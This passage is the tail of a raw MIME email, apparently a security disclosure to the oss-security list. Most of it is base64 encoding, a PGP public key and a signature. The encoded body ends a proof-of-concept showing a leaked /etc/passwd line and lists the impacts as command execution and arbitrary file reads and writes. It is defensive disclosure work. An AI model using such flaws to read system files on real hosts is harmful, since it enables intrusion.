Pic8L3NwYW4+PGRpdj48c3Bhbj5kYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3Ni
aW4vbm9sb2dpbjwvc3Bhbj48L2Rpdj48ZGl2Pi0tLS0tIFNOSVAgLS0tLS08L2Rpdj48L3NwYW4+
PC9kaXY+PC9kaXY+PHAgZGF0YS1zdGFydD0iMTA3MiIgZGF0YS1lbmQ9IjEwNzgiPkltcGFjdDwv
cD48cCBkYXRhLXN0YXJ0PSIxMDgwIiBkYXRhLWVuZD0iMTE0MiI+RGVwZW5kaW5nIG9uIGRlcGxv
eW1lbnQgY29uZmlndXJhdGlvbiwgdGhlc2UgaXNzdWVzIG1heSBhbGxvdzo8L3A+PHVsIGRhdGEt
c3RhcnQ9IjExNDMiIGRhdGEtZW5kPSIxMjMxIj48bGkgZGF0YS1zZWN0aW9uLWlkPSIxOXFzODY1
IiBkYXRhLXN0YXJ0PSIxMTQzIiBkYXRhLWVuZD0iMTE2MiI+PHAgZGF0YS1zdGFydD0iMTE0NSIg
ZGF0YS1lbmQ9IjExNjIiPmNvbW1hbmQgZXhlY3V0aW9uPC9wPjwvbGk+PGxpIGRhdGEtc2VjdGlv
bi1pZD0iMTlxczg2NSIgZGF0YS1zdGFydD0iMTE0MyIgZGF0YS1lbmQ9IjExNjIiPjxwIGRhdGEt
c3RhcnQ9IjExNDUiIGRhdGEtZW5kPSIxMTYyIj5yZWFkaW5nIGFyYml0cmFyeSBmaWxlczwvcD48
L2xpPjxsaSBkYXRhLXNlY3Rpb24taWQ9IjEzbnZxam0iIGRhdGEtc3RhcnQ9IjExODkiIGRhdGEt
ZW5kPSIxMjMxIj48cCBkYXRhLXN0YXJ0PSIxMTkxIiBkYXRhLWVuZD0iMTIzMSI+d3JpdGluZyBh
dHRhY2tlci1jb250cm9sbGVkIG91dHB1dCBmaWxlczwvcD48L2xpPjwvdWw+PHAgZGF0YS1zdGFy
dD0iMTIzMyIgZGF0YS1lbmQ9IjEyNDMiPkRpc2Nsb3N1cmU8L3A+PHAgZGF0YS1zdGFydD0iMTI0
NSIgZGF0YS1lbmQ9IjE0MTEiPlRoZSB1cHN0cmVhbSBkZXZlbG9wZXIgd2FzIGNvbnRhY3RlZCBw
cmV2aW91c2x5IHJlZ2FyZGluZyB0aGVzZSBpc3N1ZXMuIE5vIHJlc3BvbnNlIHdhcyByZWNlaXZl
ZCwgc28gdGhpcyBub3RpY2UgaXMgYmVpbmcgc2VudCB0byB0aGUgb3NzLXNlY3VyaXR5IGxpc3Qg
Zm9yIGF3YXJlbmVzcy48YnI+PGJyPkF1Z3VzdCAzMHRoIDIwMjU8YnI+U2VwdGVtYmVyIDZ0aCAy
MDI1PC9wPjxwIGRhdGEtc3RhcnQ9IjEyNDUiIGRhdGEtZW5kPSIxNDExIj5UaGFua3MgQWxsIC0t
PC9wPjwvZGl2PjxkaXYgc3R5bGU9ImZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsgZm9u
dC1zaXplOiAxNHB4OyIgY2xhc3M9InByb3Rvbm1haWxfc2lnbmF0dXJlX2Jsb2NrIj48ZGl2IGNs
YXNzPSJwcm90b25tYWlsX3NpZ25hdHVyZV9ibG9jay11c2VyIj4KICAgIDwvZGl2PgogICAgPGRp
diBzdHlsZT0iZm9udC1mYW1pbHk6IEFyaWFsLCBzYW5zLXNlcmlmOyBmb250LXNpemU6IDE0cHg7
Ij48YnI+PC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJwcm90b25tYWlsX3NpZ25hdHVyZV9ibG9jay1w
cm90b24iPgogICAgICAgIFNlbnQgd2l0aCA8YSBocmVmPSJodHRwczovL3Byb3Rvbi5tZS9tYWls
L2hvbWUiIHRhcmdldD0iX2JsYW5rIj5Qcm90b24gTWFpbDwvYT4gc2VjdXJlIGVtYWlsLgogICAg
PC9kaXY+CjwvZGl2Pgo=

-----------------------976c1e9d9041f86e37d48a344ea2340f--

-----------------------5ad6be03bf5b32421fe2ccad79471c26--

-----------------------dd323473e62ef34d455d53cf67a42283
Content-Type: application/pgp-keys; filename="publickey - christopher.downs@vadersecurity.com - 0x9776492D.asc"; name="publickey - christopher.downs@vadersecurity.com - 0x9776492D.asc"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="publickey - christopher.downs@vadersecurity.com - 0x9776492D.asc"; name="publickey - christopher.downs@vadersecurity.com - 0x9776492D.asc"

LS0tLS1CRUdJTiBQR1AgUFVCTElDIEtFWSBCTE9DSy0tLS0tCgp4c0ZOQkYwQjBna0JFQUNYVXBn
djVxRVRzb0M2Z3VOTzczUmd3ZGZqc3JwT2VpM1hBMWZqN3pxb2VTYnMKOTFzT0VUL1NUYlBzL1pH
NHMydnZnZGk0VmNYWThZQmlpZDlpTkFNblVmRkE0ZElYVUdJV3lHN215dG1TCjZPSzdzUEJyY1Bo
U2kzYXZlU0JiQjhVTHZLMVMxdGlIUUpwbVdKMmlWdWZFdktKVDJ0ckFkNlFGeGJacApMbkJJU0g0
dUJJa2ZLeTArVTBtRTVXZ1JFeHpZdjdxY25vall3WHVFbXZscjAwSGJCZFJ3QjEycnlucnAKY2xU
eXNjSy92T1FIV1BFLy96Y0h5Tm85SWRPYmF4VjVLQmpJMnduSGkvL3JrbnBjUXlLOG4xdDNOazdY
ClM0aWlzUTQ4Mm93RkZRZHN2VzFmMnBic0tvdmZ3UU5OcHlodzNjYmdOUWlMQXEwMCtOVzdVMHB6
VHBwRQoxSVZNVlFQQUZVeDJHdEFkS2RicXF4K1Q5V2JvYmdneGRSR3ZmTE5BZ0F4U09wdVg2UGpl
VUMrV24xVzYKd3hEa2dncXRBcGEyVkUzOVBjdlZGeXcvdlVwU0FPUFBUWWZUODhnV0dLUDhCUlFu
ZGVBdnNvaGZ3SmVUCllrT1k4VEJ0b0tjY0svQ0Z1MVp0d3hrbGtvKyttd0lYbmpWTElLZFJXZXFj
Wm9udGZ2YTJYVU9DcldCYwpzSnJiOExXR0Mya2g3dnV1a0cyZXIweExqZzBTVHBEUHNuOXFFdWZx
SVE0T2xwdmdvKzZocjNSNWtKYTYKM3l5NDUyYm9YVXJDTlhvalYvNEluK0RSbThXem45bTc3M3dH
bk1tdTd0NHRITnVqN0tnek9TYk1kT21SCkRhUzdKN3ZaY0tTd0hNdk5hRU5Ta2x0dkpzeTIxd2xo
OFNiTzZRQVJBUUFCelVsamFISnBjM1J2Y0dobApjaTVrYjNkdWMwQjJZV1JsY25ObFkzVnlhWFI1
TG1OdmJTQThZMmh5YVhOMGIzQm9aWEl1Wkc5M2JuTkEKZG1Ga1pYSnpaV04xY21sMGVTNWpiMjAr
d3NGMUJCQUJDQUFmQlFKZEFkSUpCZ3NKQndnREFnUVZDQW9DCkF4WUNBUUlaQVFJYkF3SWVBUUFL
Q1JEQ0NhQ0wzNkZYRWtCVEQvOWVUdTBwb0UvU2R0dTFGSk45cStwdgpDWkFrTU1rUWNuNVd1R2tr
bTJWaDQ5em5EN1FqaTRaazN0dHdHYzN1RnJ0Y01HTUo0V0NudEljWlB4ZHQKOHZnY2tQWnpVZXkx
eEM3NlFsMnJFa1JwN1Y4Njc0eUZCR3BJTEhlUEcyMUc0ZnpVOXZVYm1PeXNZU0FVCjArc2dPbVlU
cWVEVVBQbHUxSS9veHJYRG1rSnk1ZWpkRWNPRi9RQ1J6QnhsOURHTFZ6WXowNjloWHNOQwpab2Q0
V0M3OTBzMUptSkZ1VzErTDhuNldUVHoxdXFFbWptZDVIYnAxdjIzYzZJbjYyMmFLT3lRUFZ1b1UK
dW9maTBKZHpiaitET0xlNWU2QlFNVWZaUUhZN3BIYisrY2FBMWJOQTlYZEQxaUV1ZHlIZG5mZ2dJ
OEsyCnh5czArZEQ2OFljaHBoSHZLVFVySWcreUp3Z21POWlJOXpNNnhTU3FhdnYza1JrZktUVVpC
TVFsVkxCZwpjcE9CN0tHUzRWdFBSQk1GT3RtaU0yUk8xTE5RbzdEeVQ2OEg4NThCUjlHZXM4bkhu
OXpuRUNiM3VXdnkKOTRNOTRXQW1sZGl1anFibUlZdkIyVHJjNVl5ZS8zVXhPMVA0QUZLdTRvZGo3
bGQ2NlZsa0U1RjYxbVNiCjBZZHI4VEJuRGlUaGU5SXJmc0E0RnZqT3licnlEQ2lyMUtNRGlFdlpG
bU01NTU3UGIycHR1N0o4aUsrbgppVjZtdTA3UTZwcVFNM0FscTBZaHRXYk9FbzVCSTZEYnArbG9Z
eUM5NEdUWkhRSmtaVndONCtVQ0xSUksKYXhIL05Xc09SQWg0elZYay9pTFpudytUQWxEV0ZFYUkw
MjNsT2MxSFpqL1h4WFUydzFiWWdsbDA0dlBMCnc4N0JUUVJkQWRJSkFSQUEycFdPMFpyNVh6NExq
T0Y0ODdSUm84YUpVSWo5VXBUY0J2eVpyTGdoajVITAp0TWVUdCtKWENHMHhvR0U4cXF1eW10b09G
Mm1RbExyeDRHbncvTjJxQmRCUjRLd2tMNk4zNzczZkxvYU0KVnYrU3JFKzBpb2UxM2hIQmxYOXZ6
NWk1ODY0c0tXVFliaWNxUXpZN0ExRTdyNlZpRHVIc1dsVnc5WVBwClJXckdtL1cyVlFZNVpPUWNq
cVlsM2RmbSswTUNWNUtHVi9LQUZoQkZNNVQyelFBMmhCRGR3VFlnWlhsYwpBTnZlOVJKVnZFKzFL
eU4zT2UyNThsYThrY05zbHlEKzJzeUtwZXFlK1NYeWpXbG1jeFYwKytoWU5OS1gKd2xUa1VpaUg4
dGNoSGcvYWxtRGRpayszaWpIUVU1TGVCRUI0WmJUWStJSENVZ1o1dktWR21YSzR1SHd4CmVWS2wv
K1BzemRlMUxGNEZiZmhIZmJETWJUMUZjYU8weVQvaGIveW9PZ1owa0FaaUZGR2N6UFRId2pBOQpu
bnJwVzNNaFZQT2pESFRzdFQ5YzN4cERoQVlRSmZBZ285NDcrcWgrQS9mNXh4SFo1SllrdTZEdGJ3
aS8KdFdveGpOL3ZPUlY3QmxkY1VJNXdPRHF6RHBWZGd2SWo2ZTNtT1NJY1NpSDkyWWN5RWVLd0cw
bmw3SFV3CldmY3hidFRra3pKL0JQdEVjeTdDZ045L1FrV3BnM2EyNGIyUUNhN0hnVnJGYk50WXd3
ekh6OTN2YjU5OQoxZ1pIRk9CZlM3U0puMW11MWd1V0pLMGhtcDVUZlJMYTJFZldBSFJVZmFVV05Z
Ym5SdXVrek1BY0l2RG4KbkJsa1Z0clpreFp0QjJYZHRDT1M5c25FZlJKU3lnMVNQRlNsRjFNQUVR
RUFBY0xCWHdRWUFRZ0FDUVVDClhRSFNDUUliREFBS0NSRENDYUNMMzZGWEVtcXdELzRteXdIZXQr
aXc4K1Y1cDZLOENPOTMwZHV2YzhPTQplS3VPSDRvWFZLc3IvRlFZaDk1Y29XUllMaWg0UVZPLzZO
OGNKRVBiOW9JTzZmU3lhdXQ4ZUlDKzdyS3kKYkNOZ09jc3RRbWFSQ0pIWGxtcVVGRVZ2MnBTM1dQ
VWZHMGpIZUp3VlQxUmlYYzk2a1MyemRpY0l3Y29KCk41VFdZRGFsNStBa1RyNmNDL256ZWlhSG5Y
Q0t2ellwSERURmEyNUFMc0NicFByTjQ2cVd4cm1qM1Bkcgp4OXJoZ2FmM3NVdTcyT3ZDTEJiM2Yy
bHlYUkxRb3NhQWdaaTlkUHlvbVJvemlic3l6SWVSS3gvZ0RvWlkKbEY0eithbW81R29MWldlUTF5
YVluandDVWpTNS9wcGVGbEFRek5lcDRhVnMxaXg0ZXpiUDlROEZxOVpYCnBFQjVnZEtsbHI5Um90
RmxpTlBnSEdqL0d3Rkt0S09oOFB2VGpTbjNxc3NGREpPRXA4QzdOTUNXNTNiagpoKy9MYm1QWEVM
OXUvdjNQU0NjOFRqNUN3dTNUL3Q5azJjZ2wrSFJleEdwTG82VXdMenFFRVBnN3p5RmcKTTdoQ2xo
elE3WExoOGlmZ2xQVy9KRStGNkNFaDBoUmFaMkVudUxMZGt2Ni9qc2ZrNUpSeUhYUmUxL0pXCmg4
TWRTVGI3cTR4MnRzRDdtZXQvbWdJeVpTbDRkWjdZUkRieE9YaUNSTEtRbjhQckZaaHEwc1lCTnps
TApra0MwcHQ4V1BNZFZLdnFxWEY2SVQ3T0lWOUhjRHkyNVUrdDQrMTVhWUwyUEZBM3lzUEVZWTNj
dUZkcGEKY2s1dkdRUGpha2tleEF4YUpsZmhlbGZWZzd1MEdQNG93M2FtRWtuSWZoU0hVRiszcmwv
WnpnPT0KPXZ4dnQKLS0tLS1FTkQgUEdQIFBVQkxJQyBLRVkgQkxPQ0stLS0tLQo=

-----------------------dd323473e62ef34d455d53cf67a42283--

--------a043c1983cdd113762287eebec6f8c317110d557b571c638388ff70107d79164
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: ProtonMail

wsG5BAEBCgBtBYJprTKeCRDCCaCL36FXEkUUAAAAAAAcACBzYWx0QG5vdGF0
aW9ucy5vcGVucGdwanMub3JneKrlRMBV+u+LizX7ZObmDHD1csixxOBfdlPu
p+DmyzgWIQSXdkkt2sDtstfl5IbCCaCL36FXEgAAogYP+wWWn28l1i7tPQnD
xHov50W+lc6peovbWWsxrcxHgb54u+fHKW1bKe3L8B/6rigoAfhMPF7UflTC
k1GX4YjzpVpQ6u76b/B7H0XAWqpVaaPX6ql4gDTGuOH2b+y30gyWZ+oxyD00
SdmBCl4XgPYrM/YZrTt5Dy2kdc8MraW5axsiIbqyWpkuk2yN0C/ASWpLAnlK
50cQKCJmDQt1GgTKu9uPPxk4m4003keR61Crpa+s5oTyBHJMLGj9Z34pPoE7
cTMpjt+OjXJoNQvZPIqqsgpKvV/gzY5jNiDVAxQ1QQ3qWVtX46f42oSCZ7MM
a+kH0tc4cqFZnE0KcAgRJwM/0xJY1jJNpVetWy1r2D6B4v/vyE2dYOG/63n9
BLeBggB9lj68ommeBYzDdDmW0NJI9KCEb8I5Wppw5PA+bcCrznCTwhlYalcF
Vp4w/x5z+uIvKAUct9ulIuT4cxKj7eT1mSZhSwq8jUWmwo7zGDi5YpTgbQOz
Cf0/+1lDvEIrodiHbyBbDwcgMuwoiPA4wyHw32PUi3LCRxs1r+DZKVlF2Osk
revFGeBRpTvjqr8cnP24pM7XlR19d/4b2yRJ1EwLqK+4jPWo/gKZi8jO/fdY
PIWpv2VoZYmsRR3+3u5tZ1bzYvj+6VcNRDnbujYwGJPqPh8iUE5+PUBVvewK
thFrUe4g
=L/8r
-----END PGP SIGNATURE-----


--------a043c1983cdd113762287eebec6f8c317110d557b571c638388ff70107d79164--

